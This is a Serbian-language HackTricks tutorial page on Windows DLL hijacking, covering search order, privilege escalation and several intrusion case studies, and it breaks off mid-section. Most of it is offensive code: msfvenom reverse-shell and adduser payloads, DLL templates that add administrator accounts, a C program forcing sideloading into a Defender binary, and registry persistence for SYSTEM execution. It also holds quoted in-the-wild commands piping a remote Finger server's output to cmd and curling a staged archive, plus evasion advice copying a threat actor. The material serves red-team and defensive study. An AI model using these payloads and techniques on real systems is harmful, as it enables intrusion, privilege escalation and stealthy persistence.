# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking uključuje manipulaciju pouzdanom aplikacijom da učita zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection, and Side-Loading**. Koristi se prvenstveno za izvršavanje koda, postizanje persistencije i, ređe, eskalaciju privilegija. Iako je ovde fokus na eskalaciji, metoda hijackinga ostaje ista bez obzira na cilj.

### Uobičajene tehnike

Za DLL hijacking koristi se nekoliko metoda, čija efikasnost zavisi od strategije učitavanja DLL-ova aplikacije:

1. **DLL Replacement**: Zamenjivanje pravog DLL-a zlonamernim, po potrebi koristeći DLL Proxying da se sačuva funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pre legitimnog, iskorišćavajući obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a koji aplikacija pokuša da učita misleći da je u pitanju nepostojeći potreban DLL.
4. **DLL Redirection**: Modifikovanje parametara pretrage kao što su %PATH% ili .exe.manifest / .exe.local fajlovi da bi se aplikacija usmerila na zlonamerni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernim u WinSxS direktorijumu, metoda često povezana sa DLL side-loading.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum koji korisnik kontroliše zajedno sa kopiranom aplikacijom, slično tehnikama Binary Proxy Execution.

> [!TIP]
> Za korak-po-korak lanac koji slaže HTML staging, AES-CTR configs i .NET implants na vrhu DLL sideloading-a, pogledajte workflow ispod.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje nedostajućih Dlls

Najčešći način za pronalaženje missing Dlls unutar sistema je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, **podešavanjem** **sledeća 2 filtera**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i prikazivanjem samo **File System Activity**:

![](<../../../images/image (153).png>)

Ako tražite **missing dlls in general** ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **missing dll inside an specific executable** treba da podesite **drugi filter kao "Process Name" "contains" `<exec name>`, pokrenete ga i zaustavite snimanje događaja**.

## Iskorišćavanje nedostajućih Dlls

Da bismo eskalirali privilegije, najbolja šansa je da možemo **upisati dll koji će proces sa višim privilegijama pokušati da učita** u neko od **mesta gde će se tražiti**. Dakle, moći ćemo da **upisemo** dll u **folder** gde se **dll traži pre** foldera gde se nalazi **original dll** (neobičan slučaj), ili ćemo moći da **upisemo u neki folder gde će se dll tražiti** a originalni **dll ne postoji** ni u jednom folderu.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** traže DLL-ove prateći skup **predefinisanih putanja pretrage**, pridržavajući se određenog reda. Problem DLL hijackinga nastaje kada je zlonamerni DLL strateški smešten u jedan od tih direktorijuma, osiguravajući da bude učitan pre autentičnog DLL-a. Rešenje za ovo je da se obezbedi da aplikacija koristi apsolutne putanje kada referiše DLL-ove koje zahteva.

Možete videti **DLL search order on 32-bit** sistemima ispod:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

To je **default** redosled pretrage sa **SafeDllSearchMode** uključenim. Kada je isključen, trenutni direktorijum se pomera na drugo mesto. Da biste onemogućili ovu opciju, kreirajte registry vrednost **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućeno).

Ako se [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funkcija pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Na kraju, imajte na umu da **dll može biti učitan navođenjem apsolutne putanje umesto samo imena**. U tom slučaju taj dll će se **tražiti samo u toj putanji** (ako dll ima zavisnosti, one će se tražiti kao da su učitane po imenu).

Postoje i drugi načini za menjanje redosleda pretrage ali ih ovde neću objašnjavati.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na DLL search path novokreiranog procesa je postavljanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa korišćenjem ntdll-ovih native API-ja. Navođenjem direktorijuma koji kontroliše napadač ovde, ciljni proces koji rešava importovani DLL po imenu (bez apsolutne putanje i bez korišćenja sigurnih flagova učitavanja) može biti prisiljen da učita zlonamerni DLL iz tog direktorijuma.

Ključna ideja
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Napomene/ograničenja
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimalan C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operativni primer upotrebe
- Postavite zlonamerni xmllite.dll (exporting the required functions or proxying to the real one) u vaš direktorijum DllPath.
- Pokrenite potpisani binarni fajl za koji je poznato da traži xmllite.dll po imenu koristeći gore navedenu tehniku. Loader rešava import putem navedenog DllPath i sideloads-uje vaš DLL.

Ova tehnika je primećena in-the-wild da pokreće multi-stage sideloading chains: inicijalni launcher ispušta helper DLL, koji zatim pokrene Microsoft-signed, hijackable binarni fajl sa custom DllPath-om da bi naterao učitavanje napadačevog DLL-a iz staging direktorijuma.


#### Izuzeci u redosledu pretrage DLL-ova iz Windows dokumentacije

Određeni izuzeci od standardnog redosleda pretrage DLL-ova su zabeleženi u Windows dokumentaciji:

- Kada se naiđe na **DLL koji deli ime sa onim koji je već učitan u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga, izvršava proveru za redirekciju i manifest pre nego što podrazumevano koristi DLL koji je već u memoriji. **U ovom scenariju, sistem ne vrši pretragu za DLL**.
- U slučajevima kada je DLL prepoznat kao **known DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju tog known DLL-a, zajedno sa svim njegovim zavisnim DLL-ovima, **odustajući od procesa pretrage**. Registry ključ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** drži listu ovih known DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga za ovim zavisnim DLL-ovima se sprovodi kao da su naznačeni samo svojim **module names**, bez obzira da li je inicijalni DLL bio identifikovan putem pune putanje.

### Eskalacija privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi pod **različitim privilegijama** (horizontal or lateral movement), kojem **nedostaje DLL**.
- Osigurajte da postoji **write access** za bilo koji **direktorijum** u kojem će se **DLL** tražiti. Ova lokacija može biti direktorijum izvršnog fajla ili direktorijum unutar system path-a.

Da, zahtevi su komplikovani za nalazak jer je **po defaultu prilično čudno naći privilegovani izvršni fajl kome nedostaje dll** i još je **čudnije imati write permissions na folder u system path-u** (po defaultu to ne možete). Ali, u pogrešno konfigurisanim okruženjima ovo je moguće.\
U slučaju da imate sreće i ispunjavate zahteve, možete proveriti projekat [UACME](https://github.com/hfiref0x/UACME). Čak i ako je **glavni cilj projekta da bypass UAC**, tamo možete naći **PoC** Dll hijaking-a za verziju Windows-a koju možete koristiti (verovatno samo menjajući putanju foldera gde imate write permissions).

Imajte na umu da možete **proveriti vaše permisije u folderu** radeći:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih direktorijuma unutar PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports izvršnog fajla i exports dll-a pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za kompletan vodič o tome kako da **abuse Dll Hijacking to escalate privileges** kada imate dozvole za pisanje u **System Path folder** pogledajte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate write permissions na bilo koji folder unutar system PATH.\
Drugi interesantni automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll_.

### Primer

U slučaju da pronađete iskorišćiv scenario, jedna od najvažnijih stvari za uspešno iskorišćavanje jeste da **create a dll that exports at least all the functions the executable will import from it**. Imajte na umu da Dll Hijacking može biti koristan za [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili za [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Možete pronaći primer **how to create a valid dll** u ovoj studiji o dll hijackingu fokusiranoj na izvršenje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll koji može da izvrši vaš maliciozni kod pri učitavanju, ali takođe da se predstavi i funkcioniše kako se očekuje relaying all the calls to the real library.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete navesti executable i izabrati biblioteku koju želite proxify i generisati proxified dll, ili navesti Dll i generisati proxified dll.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobijte meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86 nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaš sopstveni

Imajte na umu da u nekoliko slučajeva Dll koji kompajlirate mora **eksportovati više funkcija** koje će biti učitane od strane ciljnog procesa; ako te funkcije ne postoje, **binary neće moći da ih učita** i **exploit će propasti**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL with thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje proverava predvidljiv DLL za lokalizaciju, specifičan za jezik, pri pokretanju, koji može biti hijackovan za arbitrary code execution i persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Naivan hijack će pokrenuti govor/istaknuti UI. Da ostanete tihi, pri attach-u nabrojte Narrator thread-ove, otvorite glavni thread (`OpenThread(THREAD_SUSPEND_RESUME)`) i `SuspendThread` ga; nastavite u svom thread-u. Pogledajte PoC za kompletan kod.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Sa navedenim, pokretanje Narrator učitava postavljeni DLL. Na secure desktop-u (ekran za prijavu), pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se preko RDP na host; na ekranu za prijavu pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.
- Izvršavanje prestaje kada se RDP sesija zatvori — izvršite inject/migrate odmah.

Bring Your Own Accessibility (BYOA)
- Možete klonirati ugrađeni Accessibility Tool (AT) registry entry (npr. CursorIndicator), izmeniti ga da pokazuje na proizvoljan binary/DLL, importovati ga, pa zatim postaviti `configuration` na to AT ime. Ovo omogućava posredovanje proizvoljnog izvršavanja unutar Accessibility framework-a.

Notes
- Pisanje u `%windir%\System32` i menjanje HKLM vrednosti zahteva admin prava.
- Sva logika payload-a može živeti u `DLL_PROCESS_ATTACH`; export-i nisu potrebni.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj slučaj demonstrira **Phantom DLL Hijacking** u Lenovo-ovom TrackPoint Quick Menu (`TPQMAssistant.exe`), evidentiran kao **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

Napadač može postaviti zlonamerni `hostfxr.dll` stub u isti direktorijum, iskoristivši odsustvo DLL-a da postigne izvršenje koda u kontekstu korisnika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, postavite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se zakazani zadatak pokrene u 9:30 u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, zlonamerni DLL se pokreće u sesiji administratora sa medium integrity.
4. Koristite standardne UAC bypass tehnike kako biste eskalirali sa medium integrity na SYSTEM privilegije.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading preko potpisanog hosta (wsc_proxy.exe)

Napadači često kombinuju MSI-based droppere sa DLL side-loadingom kako bi izvršili payload pod pouzdanim, potpisanim procesom.

Chain overview
- Korisnik preuzme MSI. CustomAction se tiho izvršava tokom GUI instalacije (npr. LaunchApplication ili VBScript akcija), rekonstruišući narednu fazu iz ugrađenih resursa.
- Dropper upisuje legitimni, potpisani EXE i zlonamerni DLL u isti direktorijum (primer para: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se potpisani EXE pokrene, Windows DLL search order prvo učitava wsc.dll iz radnog direktorijuma, izvršavajući napadačev kod pod potpisanim roditeljem (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction tabela:
- Tražite unose koji pokreću izvršne fajlove ili VBScript. Primer sumnjivog obrasca: LaunchApplication koji izvršava ugrađeni fajl u pozadini.
- U Orca (Microsoft Orca.exe), pregledajte CustomAction, InstallExecuteSequence i Binary tabele.
- Ugrađeni/podeljeni payloadovi u MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Tražite više malih fragmenata koji se konkateniraju i dešifruju pomoću VBScript CustomAction. Uobičajen tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktično sideloading sa wsc_proxy.exe
- Ubaci ova dva fajla u isti direktorijum:
- wsc_proxy.exe: legitiman potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: attacker DLL. Ako nisu potrebni specifični eksporti, DllMain je dovoljan; inače, napravi proxy DLL i prosledi potrebne eksporte pravoj biblioteci dok pokrećeš payload u DllMain.
- Izgradi minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za zahteve vezane za export, koristite proxying framework (npr. DLLirant/Spartacus) da generišete prosleđujuću DLL koja takođe izvršava vaš payload.

- Ova tehnika se oslanja na DLL name resolution od strane host binarija. Ako host koristi apsolutne putanje ili safe loading flagove (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može da ne uspe.
- KnownDLLs, SxS i forwarded exports mogu uticati na precedence i moraju se uzeti u obzir pri izboru host binarija i skupa export-a.

## Potpisane triade + enkriptovani payloadi (ShadowPad case study)

Check Point je opisao kako Ink Dragon deploy-uje ShadowPad koristeći **tri-fajlnu triadu** da se uklopi sa legitimnim softverom dok srž payload-a ostaje enkriptovana na disku:

1. **Signed host EXE** – dobavljači kao AMD, Realtek ili NVIDIA su zloupotrebljeni (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju izvršni fajl da izgleda kao Windows binar (na primer `conhost.exe`), ali Authenticode potpis ostaje validan.
2. **Malicious loader DLL** – ubačena pored EXE-a sa očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binar obfuskovan ScatterBrain framework-om; jedina njena uloga je da locira enkriptovani blob, dekriptuje ga i reflectively map-uje ShadowPad.
3. **Encrypted payload blob** – često smešten kao `<name>.tmp` u istom direktorijumu. Nakon memory-mapping-a dekriptovanog payload-a, loader briše TMP fajl da uništi forenzičke dokaze.

Tradecraft napomene:

* Preimenovanje potpisanog EXE-a (uz zadržavanje originalnog `OriginalFileName` u PE header-u) omogućava da se prerušava u Windows binar ali zadrži vendor potpis, zato replicirajte Ink Dragon naviku da drop-ujete binarije koji liče na `conhost.exe` ali su zapravo AMD/NVIDIA utiliti.
* Pošto izvršni fajl ostaje trusted, većina allowlisting kontrola obično zahteva samo da se vaša malicious DLL nalazi pored njega. Fokusirajte se na prilagođavanje loader DLL-a; potpisani parent obično može ostati neizmenjen.
* ShadowPad-ov decryptor očekuje da TMP blob živi pored loader-a i da bude writable kako bi ga mogao zero-ovati nakon mapping-a. Obezbedite da direktorijum bude writable dok se payload ne učita; jednom kada je u memoriji, TMP fajl se može bezbedno izbrisati radi OPSEC-a.

### LOLBAS stager + višestepeni lanac sideload-ovanja arhive (finger → tar/curl → WMI)

Operatori kombinuju DLL sideloading sa LOLBAS tako da je jedini custom artefakt na disku malicious DLL pored trusted EXE-a:

- **Remote command loader (Finger):** Hidden PowerShell spawn-uje `cmd.exe /c`, povlači komande sa Finger servera i prosleđuje ih `cmd`-u:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` preuzima TCP/79 text; `| cmd` izvršava odgovor servera, omogućavajući operatorima da rotiraju second stage server-side.

- **Built-in download/extract:** Skidajte arhivu sa benignom ekstenzijom, raspakujte je i stage-ujte sideload target plus DLL pod nasumičnim `%LocalAppData%` folderom:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` skriva progres i prati redirect-e; `tar -xf` koristi Windows-ov ugrađeni tar.

- **WMI/CIM launch:** Pokrenite EXE preko WMI tako da telemetrija pokaže CIM-created proces dok učitava kolokovanu DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Radi sa binarijima koji preferiraju lokalne DLL-ove (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) se pokreće pod trusted imenom.

- **Hunting:** Alert-ujte na `forfiles` kada se `/p`, `/m` i `/c` pojavljuju zajedno; retko van admin skripti.

## Studija slučaja: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Jedna nedavna Lotus Blossom intruzija zloupotrebila je trusted update lanac da isporuči NSIS-packed dropper koji je stage-ovao DLL sideload plus potpuno in-memory payload-e.

Tradecraft flow
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, drop-uje preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll`, i enkriptovani blob `BluetoothService`, zatim pokreće EXE.
- Host EXE importuje `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` mmap-load-uje blob; `LogWrite` ga dekriptuje custom LCG-based stream-om (konstante **0x19660D** / **0x3C6EF35F**, key material izveden iz prethodnog hash-a), prepisuje buffer plaintext shellcode-om, oslobađa temp-ove i skače na njega.
- Da bi izbegao IAT, loader rešava API-je heširanjem export imena koristeći **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, zatim primenjuje Murmur-style avalanche (**0x85EBCA6B**) i poredi protiv salted target hash-eva.

Main shellcode (Chrysalis)
- Dekriptuje PE-like main modul ponavljanjem add/XOR/sub sa ključem `gQ2JR&9;` kroz pet prolaza, zatim dinamički load-uje `Kernel32.dll` → `GetProcAddress` da završi import resolution.
- Rekonstruiše DLL name stringove u runtime-u preko per-character bit-rotate/XOR transformacija, zatim load-uje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi drugi resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaku export tabelu u 4-byte blokovima sa Murmur-style mešanjem, i samo fallback-uje na `GetProcAddress` ako heš nije pronađen.

Embedded konfiguracija & C2
- Konfig živi unutar dropovanog `BluetoothService` fajla na **offset 0x30808** (veličina **0x980**) i RC4-dekriptovana je sa ključem `qwhvb^435h&*7`, otkrivajući C2 URL i User-Agent.
- Beaconi prave tačkasto-odvojeni host profil, prefiksiraju tag `4Q`, zatim RC4-enkriptuju sa ključem `vAuig34%^325hGV` pre `HttpSendRequestA` preko HTTPS. Odgovori su RC4-dekriptovani i dispečovani po tag switch-u (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer slučajevi).
- Execution mode je uslovljen CLI arg-ovima: bez argova = instalira persistence (service/Run key) koji pokazuje na `-i`; `-i` relaunch-uje self sa `-k`; `-k` preskače instalaciju i pokreće payload.

Alternate loader observed
